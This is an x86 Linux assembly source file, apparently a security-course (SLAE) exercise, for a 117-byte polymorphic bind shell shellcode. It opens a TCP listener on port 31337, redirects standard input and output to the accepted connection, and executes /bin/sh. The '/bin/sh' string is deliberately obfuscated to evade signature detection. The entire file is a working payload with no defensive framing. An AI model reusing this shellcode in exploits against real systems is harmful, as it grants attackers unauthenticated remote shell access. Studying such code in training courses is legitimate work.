; Title: Bind Shell TCP Polymorphic Shellcode - 117 byte
; Platform: linux/x86
; Date: 2015-01-17
; Author: Dennis 'dhn' Herrmann
; Website: https://zer0-day.pw
; Github: https://github.com/dhn/SLAE/
; SLAE-721
;
; The orignal shellcode is implemented by:
; Russell Willis <codinguy@gmail.com>

BITS 32

global _start
section .text

_start:
	; the orginal version:
	; xor edx, edx
	cdq                           ; clean edx

	xor eax, eax                  ; clean eax
	xor ebx, ebx                  ; clean ebx
	xor ecx, ecx                  ; clean ecx

socket:
	; socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

	mov al, 0x66                  ; syscall 0x66 -> socketcall()
	mov bl, 0x1                   ; socket()
	push 0x6                      ; IPPROTO_TCP = 0x06
	push 0x1                      ; SOCK_STREAM = 0x01
	push 0x2                      ; PF_INET     = 0x02
	mov ecx, esp                  ; save pointer to ecx
	int 0x80                      ; syscall socket()

	; the orginal version:
	; mov esi, eax
	xchg esi, eax
bind:
	; bind(sockfd, [AF_INET, PORT, INADDR_ANY], len(struct));

	mov al, 0x66                  ; syscall 0x66 -> socketcall()

	; the orginal version:
	; mov bl, 0x2
	pop ebx                       ; pop 0x2 to ebx -> bind()

	push edx                      ; INADDR_ANY = 0x00
	push 0x697a                   ; PORT = 31337
	push bx                       ; AF_INET = 0x02 (ebx is also 0x02)
	mov ecx, esp                  ; save pointer to ecx (struct)
	push 0x10                     ; len(struct) = 0x10 (16 byte)
	push ecx                      ; the struct which is stored in ecx
	push esi                      ; push the sockfd to the stack
	mov ecx,esp                   ; save pointer to ecx
	int 0x80                      ; syscall bind()

listen:
	; listen(sockfd, backlog);

	mov al, 0x66                  ; syscall 0x66 -> socketcall()
	mov bl, 0x4                   ; listen()
	push 0x1                      ; backlog = 0x1
	push esi                      ; push the sockfd to the stack
	mov ecx, esp                  ; save pointer to ecx
	int 0x80                      ; syscall listen()

accept:
	; accept(sockfd, struct, len(struct));

	mov al, 0x66                  ; syscall 0x66 -> socketcall()
	mov bl, 0x5                   ; accept()
	push edx                      ; len(struct) = NULL
	push edx                      ; struct = NULL
	push esi                      ; push the sockfd to the stack
	mov ecx, esp                  ; save pointer to ecx
	int 0x80                      ; syscall accept()

	; the orginal version:
	; mov ebx,eax
	xchg ebx, eax                 ; change ebx against eax

	xor ecx,ecx                   ; clean the ecx register
	mov cl, 0x3                   ; ecx = 0x03 (STDIN, STDOUT, STDERR)
dupfd:
	; dup2(oldfd, newfd);

	dec cl                        ; decrement the counter
	mov al, 0x3f                  ; syscall 0x3f
	int 0x80                      ; syscall dup2()
	jne dupfd                     ; jump to dupfd

exec:
	; execve("//bin/sh", 0, 0);

	push 0xb                      ; push syscall execve to the stack
	pop eax                       ; pop it to eax

	xor ecx, ecx                  ; clean ecx
	mov DWORD [esp], ecx          ; alternative for: push ecx

	mov esi, 0x15611d3d           ; obfuscated version of:
	add esi, 0x53121231           ; push 0x68732f6e
	mov DWORD [esp], esi          ; -

	mov DWORD [esp-3], 0x6e69622f ; obfuscated version of:
	sub esp, 0x3                  ; push 0x6e69622f

	mov ebx,esp                   ; save pointer to ebx
	mov edx,ecx                   ; set zero to edx
	int 0x80                      ; syscall execve
